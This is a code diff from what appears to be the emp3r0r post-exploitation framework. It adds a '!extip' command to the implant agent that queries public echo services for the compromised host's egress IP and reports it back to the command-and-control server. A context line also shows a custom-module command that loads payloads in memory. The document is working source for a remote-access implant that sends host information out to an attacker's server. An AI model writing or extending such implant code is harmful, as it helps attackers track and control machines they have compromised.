@@ -13,6 +13,7 @@ import (
 	"github.com/fxamacker/cbor/v2"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
+	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
 
@@ -74,6 +75,19 @@ func runStat(cmd *cobra.Command, args []string) {
 		return
 	}
 	c2transport.NotifyC2Binary(cmd, data)
+}
+
+// runExtIP implements !extip [--quiet]: detect the agent's public egress
+// IP (3 random public echo services raced, first answer wins) and report
+// it back to the CC. The CC updates the agent record and re-broadcasts it
+// to web clients; with --quiet the result is not rendered in the console.
+func runExtIP(cmd *cobra.Command, args []string) {
+	ip := agentutils.GetExternalIP()
+	if ip == "" {
+		c2transport.NotifyC2(cmd, "external IP detection failed (no direct internet?)\n")
+		return
+	}
+	c2transport.NotifyC2(cmd, "%s", ip)
 }
 
 // runCustomModule implements !custom_module --mod_name <name> --invocation <base64> --checksum <checksum> --in_mem <bool> --type <payload_type> --file_to_download <file> --peer <ip> [--token <sid>]
